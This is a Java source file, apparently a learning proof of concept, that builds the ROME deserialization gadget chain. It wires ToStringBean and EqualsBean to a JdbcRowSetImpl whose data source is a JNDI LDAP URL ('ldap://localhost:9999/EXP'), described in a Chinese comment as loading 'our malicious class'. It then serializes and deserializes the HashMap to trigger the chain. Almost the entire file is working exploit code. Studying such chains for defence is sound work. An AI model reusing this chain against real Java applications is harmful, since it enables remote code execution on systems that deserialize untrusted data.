package ROME;

import Serial.Serial;
import com.sun.rowset.JdbcRowSetImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;

import java.lang.reflect.Field;
import java.util.HashMap;

public class ROME_JNDI {

    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        #EXP为我们的恶意类
        String url = "ldap://localhost:9999/EXP";
        jdbcRowSet.setDataSourceName(url);


        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class,jdbcRowSet);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class,toStringBean);

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("aaa", "123");

        Field field = HashMap.class.getDeclaredField("table");
        field.setAccessible(true);
        Object[] array = (Object[]) field.get(hashMap);
        Object node = array[0];
        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, equalsBean);

        Serial.Serialize(hashMap);
        Serial.DeSerialize("ser.bin");
    }

    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }
}